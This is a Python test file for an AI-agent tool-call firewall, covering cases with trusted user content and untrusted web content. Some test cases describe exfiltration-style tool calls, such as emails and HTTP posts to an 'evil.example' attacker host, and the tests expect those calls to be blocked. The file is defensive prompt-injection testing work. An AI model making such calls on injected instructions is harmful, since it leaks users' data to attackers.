"""Table-driven tests for policy evaluation across all tools, contexts, and stages."""
from __future__ import annotations

from pathlib import Path
import pytest
from firewall.labels import Label, TaintedContext, ToolCall, Verdict
from firewall.policy import Policy


@pytest.fixture
def policy() -> Policy:
    yaml_path = Path(__file__).resolve().parents[1] / "policies" / "default.yaml"
    return Policy.from_yaml(yaml_path)


def test_clean_context_all_tools_allowed(policy: Policy) -> None:
    tools = [
        ("search_notes", {"query": "recipe"}),
        ("read_webpage", {"url": "https://example.com/recipes"}),
        ("read_file", {"path": "user/notes.txt"}),
        ("write_file", {"path": "user/out.txt", "text": "hello"}),
        ("send_email", {"to": "alice@example.com", "subject": "Hi", "body": "text"}),
        ("http_post", {"url": "https://example.com/api", "data": "payload"}),
        ("run_shell", {"cmd": "ls"}),
        ("delete_file", {"path": "user/old.txt"}),
        ("unknown_tool", {"foo": "bar"}),
    ]

    for stage in (1, 2):
        ctx = TaintedContext()
        ctx.add(ctx.make_segment("User asks to do some task", Label.TRUSTED, "user"))
        for tool_name, args in tools:
            call = ToolCall(call_id="call_x", name=tool_name, args=args)
            dec = policy.evaluate(call, ctx, stage=stage)
            assert dec.verdict == Verdict.ALLOW, f"Failed for {tool_name} stage {stage}"
            assert dec.rule_id == "clean_context"


def test_tainted_context_table_driven(policy: Policy) -> None:
    # Context contains user input with specific trusted arguments and an untrusted webpage
    user_text = (
        "Please visit https://example.com/allowed, save to user/saved.txt, "
        "send to friend@example.com, post to https://example.com/post, "
        "and run echo test or delete user/trash.txt"
    )

    cases = [
        # (tool, args, stage, expected_verdict, expected_rule_id)
        # search_notes (tainted: allow)
        ("search_notes", {"query": "untrusted query"}, 1, Verdict.ALLOW, "search_notes:allow"),
        ("search_notes", {"query": "untrusted query"}, 2, Verdict.ALLOW, "search_notes:allow"),
        # read_file (tainted: allow)
        ("read_file", {"path": "inbox/email_01.txt"}, 1, Verdict.ALLOW, "read_file:allow"),
        ("read_file", {"path": "inbox/email_01.txt"}, 2, Verdict.ALLOW, "read_file:allow"),
        # read_webpage (allow_if_args_trusted)
        ("read_webpage", {"url": "https://example.com/allowed"}, 1, Verdict.ALLOW, "read_webpage:allow_if_args_trusted"),
        ("read_webpage", {"url": "https://example.com/allowed"}, 2, Verdict.ALLOW, "read_webpage:allow_if_args_trusted"),
        ("read_webpage", {"url": "https://evil.example/malicious"}, 1, Verdict.BLOCK, "read_webpage:allow_if_args_trusted"),
        ("read_webpage", {"url": "https://evil.example/malicious"}, 2, Verdict.BLOCK, "read_webpage:allow_if_args_trusted"),
        # write_file (tainted: ask, sensitive: [path], provenance_override: default true)
        ("write_file", {"path": "user/saved.txt", "text": "data"}, 1, Verdict.ASK, "write_file:ask"),
        ("write_file", {"path": "user/saved.txt", "text": "data"}, 2, Verdict.ALLOW, "provenance_override"),
        ("write_file", {"path": "user/injected.txt", "text": "data"}, 2, Verdict.ASK, "write_file:ask"),
        # send_email (tainted: block, sensitive: [to])
        ("send_email", {"to": "friend@example.com", "subject": "s", "body": "b"}, 1, Verdict.BLOCK, "send_email:block"),
        ("send_email", {"to": "friend@example.com", "subject": "s", "body": "b"}, 2, Verdict.ALLOW, "provenance_override"),
        ("send_email", {"to": "attacker@evil.example", "subject": "s", "body": "b"}, 2, Verdict.BLOCK, "send_email:block"),
        # http_post (tainted: block, sensitive: [url])
        ("http_post", {"url": "https://example.com/post", "data": "d"}, 1, Verdict.BLOCK, "http_post:block"),
        ("http_post", {"url": "https://example.com/post", "data": "d"}, 2, Verdict.ALLOW, "provenance_override"),
        ("http_post", {"url": "https://evil.example/collect", "data": "d"}, 2, Verdict.BLOCK, "http_post:block"),
        # run_shell (provenance_override: false)
        ("run_shell", {"cmd": "echo test"}, 1, Verdict.BLOCK, "run_shell:block"),
        ("run_shell", {"cmd": "echo test"}, 2, Verdict.BLOCK, "run_shell:block"),
        # delete_file (provenance_override: false)
        ("delete_file", {"path": "user/trash.txt"}, 1, Verdict.BLOCK, "delete_file:block"),
        ("delete_file", {"path": "user/trash.txt"}, 2, Verdict.BLOCK, "delete_file:block"),
        # unknown tool (default: ask)
        ("custom_tool", {"arg": "val"}, 1, Verdict.ASK, "default"),
        ("custom_tool", {"arg": "val"}, 2, Verdict.ASK, "default"),
    ]

    for tool_name, args, stage, exp_verdict, exp_rule_id in cases:
        ctx = TaintedContext()
        ctx.add(ctx.make_segment(user_text, Label.TRUSTED, "user"))
        ctx.add(ctx.make_segment("Untrusted web content s2", Label.UNTRUSTED, "webpage"))

        call = ToolCall(call_id="call_test", name=tool_name, args=args)
        dec = policy.evaluate(call, ctx, stage=stage)
        assert dec.verdict == exp_verdict, f"Verdict mismatch for {tool_name} stage {stage}: got {dec.verdict}, expected {exp_verdict}"
        assert dec.rule_id == exp_rule_id, f"Rule ID mismatch for {tool_name} stage {stage}: got {dec.rule_id}, expected {exp_rule_id}"
